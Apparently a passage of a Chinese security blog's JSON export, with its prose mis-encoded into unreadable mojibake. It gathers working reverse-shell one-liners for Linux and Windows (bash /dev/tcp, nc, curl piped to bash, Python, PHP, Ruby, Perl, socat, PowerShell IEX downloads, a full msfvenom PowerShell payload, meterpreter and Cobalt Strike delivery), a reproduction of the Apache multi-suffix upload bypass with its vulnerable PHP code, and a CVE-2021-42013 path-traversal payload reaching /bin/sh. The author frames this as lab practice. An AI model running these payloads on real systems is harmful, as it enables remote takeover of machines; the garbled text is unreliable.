'{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjEzNS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}' åœ¨kaliä¸­æ‰§è¡Œä¼šè§£ææˆç¼–ç å‰çš„bashå‘½ä»¤ 2. ncåå¼¹ nc -e /bin/bash 192.168.17.135 8888 -eåé¢è·Ÿçš„å‚æ•°ä»£è¡¨çš„æ˜¯åœ¨åˆ›å»ºè¿æ¥åæ‰§è¡Œçš„ç¨‹åºï¼Œè¿™é‡Œä»£è¡¨åœ¨è¿æ¥åˆ°è¿œç¨‹åå¯ä»¥åœ¨è¿œç¨‹æ‰§è¡Œä¸€ä¸ªæœ¬åœ°shell(/bin/bash)ï¼Œä¹Ÿå°±æ˜¯åå¼¹ä¸€ä¸ªshellç»™è¿œç¨‹ï¼Œå¯ä»¥çœ‹åˆ°è¿œç¨‹å·²ç»æˆåŠŸåå¼¹åˆ°äº†shellï¼Œå¹¶ä¸”å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚ 3. curlåå¼¹ Kaliå¼€å¯apacheæœåŠ¡ï¼ŒæŠŠbashå‘½ä»¤å†™å…¥htmlæ–‡ä»¶ï¼Œåªè¦æ–‡æœ¬åŒ…å«bashä¸€å¥è¯å³å¯ã€‚ å¼€å¯apacheå¯å‚è€ƒï¼šKali Linxuä¸­æ‰“å¼€ApacheæœåŠ¡ curl 192.168.17.137/bash.html|bash //å½“å‰kaliåœ°å€ 4. whoisåå¼¹ whois -h 192.168.17.135 -p 4444 `pwd` //åå¼¹çš„shellåªèƒ½æ‰§è¡Œåé¢å¸¦çš„å‘½ä»¤ 5. pythonåå¼¹ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.17.135\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 6. PHPåå¼¹ phpåå¼¹shellå’Œpythonçš„æ–¹å¼å·®ä¸å¤š php -r '$sock=fsockopen(\"192.168.17.135\",8888);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' 7. rubyåå¼¹ ruby -rsocket -e'f=TCPSocket.open(\"192.168.17.135\",8888).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)' ä½†è¿™ä¸ªè¯­å¥ä¼¼ä¹ä¸èƒ½ç”¨äº†å§ï¼ŒæŠ¥äº†å¦‚ä¸‹é”™è¯¯ æœå¯»å‘ç°ä¸‹åˆ—è¯­å¥ ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"192.168.17.135\",\"8888\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' ruby -rsocket -e 'c=TCPSocket.new(\"192.168.17.135\",\"8888\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' è¿™ä¸¤ç§æ–¹æ³•å‡å¯ 8. socatåå¼¹ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.17.135:8888 ä½†æ˜¯ä¹±ç çœŸçš„çƒ¦ï¼Œæˆ‘ä¹Ÿæ²¡ç»†ç©¶ä¸ºä½• 9. Perlåå¼¹ perl -e 'use Socket;$i=\"192.168.17.135\";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};' å››ã€Windowsä¸‹åå¼¹shell 1. powercatåå¼¹ ç”¨IEXä¸‹è½½è¿œç¨‹PS1è„šæœ¬å›æ¥æƒé™ç»•è¿‡æ‰§è¡Œ ä½¿ç”¨powershellæ‰§è¡ŒIEX powershell IEX (New-Object System.Net.Webclient).DownloadString('https://github.com/besimorhino/powercat/blob/master/powercat.ps1');powercat -c 192.168.17.137 -p 8888 -e cmd è¿™é‡Œæˆ‘ä¹Ÿå¾ˆå¤´ç–¼ä¸€ç›´ä¸æˆåŠŸï¼Œæˆ‘æ„Ÿè§‰ä»ç½‘ä¸Šä¸‹è½½ç»•è¿‡è‚¯å®šå¯è¡Œï¼Œä½†ä¼¼ä¹å¤±è¯¯ç‡å¾ˆé«˜ï¼Œæ¯•ç«Ÿç›®æ ‡æ–‡ä»¶çš„æ ¼å¼å¾ˆå®¹æ˜“çŠ¯é”™ï¼Œå½“ç„¶æˆ–è®¸å¯ä»¥ä¸‹è½½åˆ°æœ¬åœ°æˆ–vpsï¼Œé€šè¿‡å±€åŸŸç½‘æˆ–è€…å…¬ç½‘è®¿é—®ä¸‹è½½ã€‚è¿™é‡Œæˆ‘é€‰æ‹©ç›´æ¥ä¸‹è½½ä½¿ç”¨çœ‹çœ‹ powercatä¸‹è½½åœ°å€ï¼šhttps://github.com/besimorhino/powercat //ä¸‹è½½åˆ°æœ¬åœ°æ‰§è¡Œ powercatä¸ºPowershellç‰ˆçš„Netcatï¼Œå®é™…ä¸Šæ˜¯ä¸€ä¸ªpowershellçš„å‡½æ•°ï¼Œä½¿ç”¨æ–¹æ³•ç±»ä¼¼Netcat #å¯¼å…¥æ¨¡å— Import-Module .\\powercat.ps1 #å¦‚æœæç¤ºæœªèƒ½åŠ è½½æŒ‡å®šæ¨¡å—ï¼Œåˆ™å¯èƒ½æ˜¯æƒé™é—®é¢˜ï¼Œä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œpowershellï¼Œç„¶åè¾“å…¥å¦‚ä¸‹ä»£ç  Set-ExecutionPolicy Unrestricted #è¾“å…¥å¦‚ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ powercat -h è¾“å…¥powercat -c 192.168.17.137 -p 8888 -e cmd 2. NCåå¼¹ æœåŠ¡ç«¯åå¼¹ï¼šnc 192.168.17.137 8888 -e c:\\windows\\system32\\cmd.exe 3. nishangåå¼¹ Nishangä¸‹è½½åœ°å€ï¼šhttps://github.com/samratashok/nishang Nishangæ˜¯ä¸€ä¸ªåŸºäºPowerShellçš„æ”»å‡»æ¡†æ¶ï¼Œæ•´åˆäº†ä¸€äº›PowerShellæ”»å‡»è„šæœ¬å’Œæœ‰æ•ˆè½½è·ï¼Œå¯åå¼¹TCP/ UDP/ HTTP/HTTPS/ ICMPç­‰ç±»å‹shell å°†nishangä¸‹è½½åˆ°æ”»å‡»è€…æœ¬åœ°ï¼Œåœ¨ç›®æ ‡æœºä½¿ç”¨powershellæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.17.1/tools/nishang-master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.17.137 -port 8888 è¿™é‡Œä¾æ—§ä¸è¡Œï¼Œæˆ–è®¸è®¿é—®æœ¬åœ°ä¸‹è½½é€Ÿåº¦å¾ˆæ…¢ï¼Œç­‰äº†å‡ åˆ†é’Ÿæˆ‘ä¹Ÿæ²¡è§ç»“æœï¼Œå› æ­¤è¿˜æ˜¯ç›´æ¥ä¸‹è½½åˆ°ç›®æ ‡æœºæ‰§è¡Œå§ã€‚ã€‚ã€‚ã€‚ Import-Module .\\Invoke-PowerShellTcp.ps1 //å¯¼å…¥æ¨¡å— #å¦‚æœæç¤ºæœªèƒ½åŠ è½½æŒ‡å®šæ¨¡å—ï¼Œåˆ™å¯èƒ½æ˜¯æƒé™é—®é¢˜ï¼Œä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œpowershellï¼Œç„¶åè¾“å…¥å¦‚ä¸‹ä»£ç  Set-ExecutionPolicy Unrestricted Invoke-PowerShellTcp -Reverse -IPAddress 192.168.17.137 -port 8888 è¿™ä¸ªè„šæœ¬linuxã€windowså‘½ä»¤å‡å¯ä»¥ä½¿ç”¨ 4. Reverse UDP shell æ”»å‡»æœºç›‘å¬ nc -lvup 8888 åˆ©ç”¨ä¸Šé¢ä¸‹è½½çš„è¿˜æ˜¯æ”¾åœ¨æ”»å‡»æœºä¸Šåœ¨ç›®æ ‡æœºä¸­powershellæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ Import-Module .\\Invoke-PowerShellUdp.ps1 Invoke-PowerShellUdp -Reverse -IPAddress 192.168.17.137 -port 8888 è¿™é‡Œæˆ‘ä¸€ç›´æ²¡é€šï¼Œä»¥ä¸ºæ˜¯ä»€ä¹ˆåˆ«çš„é—®é¢˜ï¼Œçœ‹æ¥è¿˜æ˜¯æµ…è–„äº†ï¼Œè¿™é‡Œçš„ç›‘å¬å‘½ä»¤å¿…é¡»ä¸ºnc -lvup portï¼Œæˆ‘è¿™é‡Œä¸€ç›´æ˜¯vnpï¼ŒæŸ¥è¯¢äº†ä¸€ç•ªå‘ç° -uï¼šæŒ‡å®šncä½¿ç”¨UDPåè®®ï¼Œé»˜è®¤ä¸ºTCP å‚è€ƒï¼šncå‘½ä»¤ç”¨æ³•ä¸¾ä¾‹ 5. MSFåå¼¹ æˆ‘ä»¬ç›´æ¥å¯ä»¥ä½¿ç”¨ msfvenom -l ç»“åˆå…³é”®å­—è¿‡æ»¤ï¼ˆå¦‚cmd/windows/reverseï¼‰ï¼Œæ‰¾å‡ºæˆ‘ä»¬éœ€è¦çš„å„ç±»åå¼¹ä¸€å¥è¯payloadçš„è·¯å¾„ä¿¡æ¯ã€‚ msfvenom -l payloads | grep 'cmd/windows/reverse' è¿™é‡Œæ‰¾powershellçš„payload ä¾ç…§å‰é¢æŸ¥æ‰¾å‡ºçš„å‘½ä»¤ç”Ÿæˆä¸€å¥è¯payloadè·¯å¾„ï¼Œæˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤ç”Ÿæˆåå¼¹ä¸€å¥è¯ï¼Œç„¶åå¤åˆ¶ç²˜è´´åˆ°é¶æœºä¸Šè¿è¡Œå³å¯ã€‚ msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.17.137 LPORT=8888 //hostä¸ºè¢«æ”»å‡»æœº powershell -w hidden -nop -c $a='192.168.17.137';$b=8888;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {start-sleep -m 100;if ($osread.IsCompleted -and $osread.Result -ne 0) {$r=$os.BaseStream.EndRead($osread);$s.Write($ob,0,$r);$s.Flush();$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);}if ($esread.IsCompleted -and $esread.Result -ne 0) {$r=$es.BaseStream.EndRead($esread);$s.Write($eb,0,$r);$s.Flush();$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);}if ($s.DataAvailable) {$r=$s.Read($nb,0,$nb.Length);if ($r -lt 1) {break;}else{$str=$e.GetString($nb,0,$r);$is.write($str);}}if($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)){break;}if($p.ExitCode -ne $null){break;}} é¶æœºæ‰§è¡Œä½¿ç”¨powershellæ‰§è¡Œpayloadï¼Œè¿™é‡Œæˆ‘ä¸€ç›´é—ªé€€ï¼Œä¹Ÿæ‰¾ä¸å‡ºä»€ä¹ˆåŸå› ï¼Œæˆ–è®¸æ˜¯è¿™ç§æ–¹æ³•è¢«æˆ‘çš„é¶æœºè¯†åˆ«äº†å§ï¼Œè¿™é‡Œé‡‡ç”¨ä¸€ä¸ªç”Ÿæˆexeæ–‡ä»¶çš„æ–¹å¼æ¥åå¼¹shell msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.17.137 LPORT=8888 -f exe -o payload.exe å¤åˆ¶payload.exeåˆ°Windowsæœºå™¨ï¼Œç„¶åkaliä¸‹å¼€å¯msfä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç›‘å¬8888ç«¯å£ï¼š msfconsole //å¯åŠ¨msf use exploit/multi/handler //ä½¿ç”¨msfçš„ä¾¦å¬æ¨¡å—exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp //è®¾ç½®è½½è·payload set LHOST 192.168.153.176 //è®¾ç½®æœ¬åœ°ç›‘å¬æœºIp set LPORT 4444 //è®¾ç½®ç›‘å¬ç«¯å£ exploit è®¾ç½®å®Œï¼Œåœ¨é¶æœºä¸Šæ‰§è¡Œexeå³å¯ç›‘å¬ æˆåŠŸ 6. Cobalt strikeåå¼¹shell Cobalt strikeçš„Scripted Web Deliveryæ¨¡å—ï¼Œå¯é€šè¿‡bitsadminã€powershellã€pythonã€regsvR32ç­‰è¿›è¡Œåå¼¹shellï¼Œç±»ä¼¼metasploitçš„web_deliveryæ¨¡å— è¿è¡ŒæœåŠ¡ç«¯ ./teamserver 192.168.17.137 123 #123ä¸ºè¿æ¥å¯†ç  è¿è¡Œå®¢æˆ·ç«¯ï¼š Windowsè¿è¡Œcobaltstrike.jar #ç”¨æˆ·åéšä¾¿è¾“å…¥ å¯†ç 123 å¼€å¯ç›‘å¬: ç‚¹å‡»Cobalt Strike-&gt;Listeners payloadå¯é€‰æ‹©windows/beacon_http/reverse_http è¯´æ˜ï¼šå…¶ä¸­windows/beacon æ˜¯Cobalt Strikeè‡ªå¸¦çš„æ¨¡å—ï¼ŒåŒ…æ‹¬dns,http,https,smbå››ç§æ–¹å¼çš„ç›‘å¬å™¨ï¼Œwindows/foreign ä¸ºå¤–éƒ¨ç›‘å¬å™¨ï¼Œå³msfæˆ–è€…Armitageçš„ç›‘å¬å™¨ã€‚ è¿™é‡Œnameéšä¾¿ï¼Œipå†™æœåŠ¡å™¨ç«¯ï¼Œç«¯å£è‡ªå®šä¹‰ ç”Ÿæˆpowershell payload: ç‚¹å‡»Attack -&gt;Scripted Web Delivery Typeé€‰æ‹© powershell payloadä¸º powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.17.137:5566/a'))\" ç”Ÿæˆä»£ç å·²ç»ç»™å‡ºäº†ï¼Œåœ¨windowsä¸Šæ‰§è¡Œ æˆ‘æ˜¯åœ¨ä¸Šå›¾ä½ç½®æ‰§è¡Œçš„ï¼Œä¸çŸ¥é“å…¶ä»–åœ°æ–¹è¡Œä¸è¡Œã€‚ ä¸è¿‡çœ‹è§åŒä¸€ç”µè„‘ä¸Šçº¿ä¸¤æ¬¡ï¼Œä¼°è®¡cmdé‡Œé¢æ‰§è¡Œä¹Ÿå¯ å³é”®ç‚¹å‡»interactè¿›å…¥shellï¼Œè¿™é‡Œipconfigç­‰å‘½ä»¤æ— æ³•æ‰§è¡Œï¼Œåº”è¯¥æ˜¯ææƒæ‰èƒ½æ‰§è¡Œå§ï¼Œè¿™é‡Œä¸æ·±å…¥äº† è¿™æ¬¡å†™çš„åå¼¹shellåªæ˜¯æƒ³æœ‰ä¸€ä¸ªæ€»ä½“çš„äº†è§£ï¼Œè¿‡ç¨‹åå·ï¼Œä¸è¿‡æˆ‘ä»¬ä¸åº”è¯¥å› ä¸ºæ­¥éª¤å¤æ‚æˆ–è€…é‡åˆ°å›°éš¾è€Œå¦¥åï¼Œåœ¨è¿‡ç¨‹ä¸­é‡åˆ°é—®é¢˜è§£å†³é—®é¢˜åŒæ ·å¯ä»¥å­¦åˆ°ä¸œè¥¿ã€‚æœ¬æ¬¡æ–‡ç« ä¹Ÿæœ‰æ¬ ç¼ºï¼Œä¸å¤Ÿå®Œç¾ï¼Œåç»­æ·±å…¥å­¦ä¹ åœ¨ç»§ç»­æ›´æ–°å§ã€‚ ç­‰ç­‰ï¼Œæœ‰å¼ºè¿«ç—‡çš„æˆ‘ï¼Œäº†è§£äº†ä¸€ä¸‹ä¸ºä½•ä¸Šè¿°å‘½ä»¤æ— æ³•æ‰§è¡Œï¼Œå› ä¸ºæŸäº›å‘½ä»¤åªæ˜¯csè‡ªå¸¦çš„ï¼Œé‚£ä¹ˆipconfigè¿™ç§cså°±æ²¡æœ‰ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å‰é¢åŠ å…¥shellå³å¯æ‰§è¡Œ äº”ã€å‚è€ƒæ–‡ç«  åå¼¹shell bash -iå‘½ä»¤ åå¼¹shellå¤±è´¥ åŸæ¥æ˜¯è¿™ä¸ªåŸå›  åå¼¹shellçš„æ–¹æ³•æ€»ç»“ [é€šè¿‡shellç»ˆç«¯ç›´æ¥æ‰“å¼€socketæ–‡ä»¶è¿›è¡ŒTCPã€UDPé€šä¿¡ï¼ˆè½¬ï¼‰](https://cnblogs.com/zl1991/p/12524924.html) Linux åå¼¹ shell å­¦ä¹  Kali linux zsh shellåˆ‡æ¢bash shell ä¸Šé¢2-6çš„æ–‡ç« å‡ä¸ºè§£å†³/dev/tcpæ‰¾ä¸åˆ°çš„æ–¹æ³• PowerShellï¼šå› ä¸ºåœ¨æ­¤ç³»ç»Ÿä¸Šç¦æ­¢è¿è¡Œè„šæœ¬ï¼Œè§£å†³æ–¹æ³• å†…ç½‘éš§é“ä»£ç†æŠ€æœ¯ï¼ˆå…­ï¼‰ä¹‹ PowerCatåå¼¹Shell msfåå¼¹shell","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["åå¼¹shell"]},{"title":"Apache HTTPD å¤šåç¼€è§£ææ¼æ´","path":"/2023/09/16/apache-httpd-duo-hou-zhui-jie-xi-lou-dong/","content":"0x01 æ¼æ´æè¿° Apache HTTPD æ”¯æŒä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªåç¼€ï¼Œå¹¶ä¸ºä¸åŒåç¼€æ‰§è¡Œä¸åŒçš„æŒ‡ä»¤ã€‚æ¯”å¦‚ï¼Œå¦‚ä¸‹é…ç½®æ–‡ä»¶ï¼š AddType text/html .html AddLanguage zh-CN .cn å…¶ç»™.htmlåç¼€å¢åŠ äº†media-typeï¼Œå€¼ä¸ºtext/htmlï¼›ç»™.cnåç¼€å¢åŠ äº†è¯­è¨€ï¼Œå€¼ä¸ºzh-CNã€‚æ­¤æ—¶ï¼Œå¦‚æœç”¨æˆ·è¯·æ±‚æ–‡ä»¶index.cn.htmlï¼Œä»–å°†è¿”å›ä¸€ä¸ªä¸­æ–‡çš„htmlé¡µé¢ã€‚ ä»¥ä¸Šå°±æ˜¯Apacheå¤šåç¼€çš„ç‰¹æ€§ã€‚å¦‚æœè¿ç»´äººå‘˜ç»™.phpåç¼€å¢åŠ äº†å¤„ç†å™¨ï¼š AddHandler application/x-httpd-php .php é‚£ä¹ˆï¼Œåœ¨æœ‰å¤šä¸ªåç¼€çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸€ä¸ªæ–‡ä»¶å«æœ‰.phpåç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆPHPæ–‡ä»¶ï¼Œæ²¡å¿…è¦æ˜¯æœ€åä¸€ä¸ªåç¼€ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°†ä¼šé€ æˆä¸€ä¸ªå¯ä»¥ç»•è¿‡ä¸Šä¼ ç™½åå•çš„è§£ææ¼æ´ã€‚ 0x02 å½±å“ç‰ˆæœ¬ ä¸Apacheç‰ˆæœ¬æ— å…³ï¼Œä¸æœåŠ¡å™¨é…ç½®æœ‰å…³ AddHandler application/x-httpd-php .php 0x03 æ¼æ´åˆ†æ index.phpä¸­æ˜¯ä¸€ä¸ªç™½åå•æ£€æŸ¥æ–‡ä»¶åç¼€çš„ä¸Šä¼ ç»„ä»¶ï¼Œä¸Šä¼ å®Œæˆåå¹¶æœªé‡å‘½åã€‚ index.phpæºç ï¼š &lt;?php if (!empty($_FILES)): $ext = pathinfo($_FILES['file_upload']['name'], PATHINFO_EXTENSION);//è¿™ç§å–æ–‡ä»¶åçš„æ–¹å¼,æœç»äº†æ¢è¡Œç¬¦ if (!in_array($ext, ['gif', 'png', 'jpg', 'jpeg'])) { //ç™½åå• die('Unsupported filetype uploaded.'); } $new_name = __DIR__ . '/uploadfiles/' . $_FILES['file_upload']['name'];//è®¾ç½®è·¯å¾„ if(!move_uploaded_file($_FILES['file_upload']['tmp_name'], $new_name)){//ä¸Šä¼ æ–‡ä»¶ die('Error uploading file - check destination is writeable.'); } die('File uploaded successfully: ' . $new_name); else: ?&gt; &lt;form method=\"post\" enctype=\"multipart/form-data\"&gt; File: &lt;input type=\"file\" name=\"file_upload\"&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; &lt;?php ä»¥gifã€pngã€jpgã€jpegä¸ºåç¼€çš„æ–‡ä»¶å‡å¯ä¸Šä¼ æˆåŠŸï¼Œå°†æ–‡ä»¶ä¿å­˜åˆ°/uploadfiles/ç›®å½•ä¸‹ï¼Œä¸Šä¼ å®Œæˆåå¹¶æœªé‡å‘½åã€‚ æŸ¥çœ‹é…ç½®æ–‡ä»¶ï¼š # cat conf/docker-php.conf AddHandler application/x-httpd-php .php DirectoryIndex disabled DirectoryIndex index.php index.html &lt;Directory /var/www/&gt; Options -Indexes AllowOverride All é…ç½®æ–‡ä»¶ä¸­å­˜åœ¨AddHandler application/x-httpd-php .phpï¼Œæ–‡ä»¶ååªè¦æœ‰.phpçš„åç¼€å°±ä¼šè¢«å½“æˆphpæ–‡ä»¶æ‰§è¡Œã€‚ 0x04 æ¼æ´å¤ç° dockerå¯åŠ¨å¥½ä¹‹åï¼Œè®¿é—®ip:80 ![image-20230916193303999](Apache HTTPD å¤šåç¼€è§£ææ¼æ´/image-20230916193303999.png) ç›´æ¥è®¿é—®http://your-ip/uploadfiles/apache.php.jpegå³å¯å‘ç°ï¼Œphpinfoè¢«æ‰§è¡Œäº†ï¼Œè¯¥æ–‡ä»¶è¢«è§£æä¸ºphpè„šæœ¬ã€‚ ![image-20230916193325731](Apache HTTPD å¤šåç¼€è§£ææ¼æ´/image-20230916193325731.png) æˆ‘ä»¬æ¥ä¸‹æ¥æ­£å¸¸æ“ä½œä¸€ä¸‹ï¼Œæ­£å¸¸ä¸Šä¼ phpæ–‡ä»¶ï¼ŒUnsupported filetype uploaded ![image-20230916193419902](Apache HTTPD å¤šåç¼€è§£ææ¼æ´/image-20230916193419902.png) é‚£åœ¨åé¢åŠ ä¸Šç™½åå•å…è®¸çš„åç¼€çœ‹çœ‹ ![image-20230916193524359](Apache HTTPD å¤šåç¼€è§£ææ¼æ´/image-20230916193524359.png) æˆåŠŸä¸Šä¼ ï¼Œè®¿é—®è¯•è¯• ![image-20230916193542496](Apache HTTPD å¤šåç¼€è§£ææ¼æ´/image-20230916193542496.png) 0x05 ä¿®å¤å»ºè®® å°†AddHandler application/x-httpd-php .phpçš„é…ç½®æ–‡ä»¶åˆ é™¤ã€‚ 0x06 å‚è€ƒæ–‡ç«  ã€æ¼æ´å¤ç°ã€‘Apache HTTPD å¤šåç¼€è§£ææ¼æ´ _","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"Apache HTTP Server 2.4.50 ä¸­çš„è·¯å¾„éå†å’Œæ–‡ä»¶æ³„éœ²æ¼æ´ (CVE-2021-42013)","path":"/2023/09/16/apache-http-server-2.4.50-zhong-de-lu-jing-bian-li-he-wen-jian-xie-lu-lou-dong-cve-2021-42013/","content":"0x01 æ¼æ´æè¿° Apache HTTP Server 2.4.50ç‰ˆæœ¬å¯¹CVE-2021-41773æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œç”±äºä¿®å¤ä¸å®Œå–„ï¼Œæ”»å‡»è€…å¯ç»•è¿‡è¡¥ä¸ï¼Œè¯»å–webç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ï¼Œåœ¨å¼€å¯cgiæ¨¡å—æ—¶ï¼Œå¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ è¯¥æ¼æ´å½±å“Apache HTTP Server 2.4.49å’Œ2.4.50ä¸¤ä¸ªç‰ˆæœ¬ï¼Œåˆ©ç”¨æ¡ä»¶å’ŒCVE-2021-41773ç›¸åŒ 0x02 æ¼æ´æˆå›  Apacheä½¿ç”¨å‡½æ•° ap_process_request_internalæ¥å¤„ç†å¤–éƒ¨è¯·æ±‚ AP_DECLARE(int) ap_process_request_internal(request_rec *r) { ..... //è°ƒç”¨ ap_normalize_path ï¼Œå…ˆå¯¹å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚ if (r-&gt;parsed_uri.path) { /* Normalize: remove /./ and shrink /../ segments, plus * decode unreserved chars (first time only to avoid * double decoding after ap_unescape_url() below). */ if (!ap_normalize_path(r-&gt;parsed_uri.path, normalize_flags | AP_NORMALIZE_DECODE_UNRESERVED)) { ap_log_rerror(APLOG_MARK, APLOG_ERR, 0, r, APLOGNO(10244) \"invalid URI path (%s)\", r-&gt;unparsed_uri); return HTTP_BAD_REQUEST; } } ..... // å†è°ƒç”¨ ap_unescape_urlï¼Œå¯¹å­—ç¬¦ä¸²è§£ç è¿‡æ»¤ã€‚ /* Ignore URL unescaping for translated URIs already */ if (access_status != DONE &amp;&amp; r-&gt;parsed_uri.path) { core_dir_config *d = ap_get_core_module_config(r-&gt;per_dir_config); if (d-&gt;allow_encoded_slashes) { access_status = ap_unescape_url_keep2f(r-&gt;parsed_uri.path, d-&gt;decode_encoded_slashes); } else { access_status = ap_unescape_url(r-&gt;parsed_uri.path); } if (access_status) { if (access_status == HTTP_NOT_FOUND) { if (! d-&gt;allow_encoded_slashes) { ap_log_rerror(APLOG_MARK, APLOG_INFO, 0, r, APLOGNO(00026) \"found %%2f (encoded '/') in URI path (%s), \" \"returning 404\", r-&gt;unparsed_uri); } } return access_status; } ..... } ..... å¼€å‘ä¸ºäº†ä¿é™©èµ·è§ï¼Œåå¤è§£ç è¿‡æ»¤ï¼Œä½†æ˜¯è¿™åè€Œå¼„å·§æˆæ‹™ï¼Œé€ æˆäºŒæ¬¡ç¼–ç æ³¨å…¥ã€‚ %32e --&gt; %2e --&gt; . %32 = 2 %2e = . â€‹ å› ä¸ºè¯¥æ¼æ´æ˜¯åœ¨CVE-2021-41773ä¿®å¤çš„åŸºç¡€ä¸Šï¼Œè¿˜ä¼šé€ æˆè·¯å¾„ç©¿è¶Šã€‚è¿™æ—¶ä¿®å¤äº†å¯¹.%2eçš„æ£€æµ‹ã€‚åœ¨å¤„ç†å¤–éƒ¨HTTPè¯·æ±‚æ—¶ï¼Œä¼šè°ƒç”¨ap_process_request_internalå‡½æ•°å¯¹urlè·¯å¾„è¿›è¡Œå¤„ç†ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ï¼Œé¦–å…ˆä¼šè°ƒç”¨ap_normalize_pathå‡½æ•°è¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œä¹‹åä¼šè°ƒç”¨ap_unescape_urlå‡½æ•°è¿›è¡ŒäºŒæ¬¡è§£ç ã€‚è¿™æ—¶å€™æˆ‘ä»¬åªéœ€è¦å°†../urlç¼–ç ä¸¤æ¬¡å°±è¡Œäº†ã€‚ ap_normalize_pathå‡½æ•°è°ƒç”¨æ ˆå¦‚ä¸‹ï¼Œ 1. åœ¨å¤„ç†å‰pathå‚æ•°ä¸º/icons/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd 2. ç»è¿‡`ap_normalize_path`å‡½æ•°å¤„ç†åpathå‚æ•°å˜æˆ/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd 3. ç»è¿‡`unescape_url`å‡½æ•°å¤„ç†åï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„urlå­—ç¬¦ä¸²å†…å®¹å˜æˆ/icons/../../../../etc/passwd è¡¥å……ä¸€ä¸‹ï¼šå¯¹äºæ²¡æœ‰è¿›è¡Œå®‰å…¨é…ç½®çš„ApacheæœåŠ¡å™¨ï¼Œé»˜è®¤æƒ…å†µå¯ä»¥â½¤xxx.com/icons/çš„æ–¹å¼æ‰“å¼€Apacheç›®å½•ä¸‹çš„iconsæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”ä¼šç½—åˆ—å‡ºæ–‡ä»¶åˆ—è¡¨ã€‚ å¦‚æœæˆ‘ä»¬é‡‡ç”¨äºŒæ¬¡ç¼–ç ï¼Œè¿™é‡Œæˆ‘è®¤ä¸ºæ˜¯ç¬¬ä¸€æ¬¡è§£ç æ ¡éªŒä¸ä¸¥è°¨ï¼Œéšåè°ƒç”¨ä¸‹ä¸€ä¸ªè§£ç å‡½æ•°è¿›è¡Œurlè§£ç é»˜è®¤ä¸ºè¯¥urlå·²ç»å®‰å…¨ï¼Œå¯¼è‡´äºŒæ¬¡ç¼–ç æ³¨å…¥ 0x03 æ¼æ´å¤ç° åœ¨CVE-2021-41773ä¸­ä½¿ç”¨/.%2e/%2e%2e/%2e%2eè¿›è¡Œè·¯å¾„ç©¿è¶Šï¼Œåœ¨2.4.50ä¸­å·²æ— æ³•ä½¿ç”¨ï¼Œä½†å¯¹2eå†è¿›è¡Œurlç¼–ç ï¼Œå³%32%65ï¼Œä»å¯å®ç°è·¯å¾„ç©¿è¶Š POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh 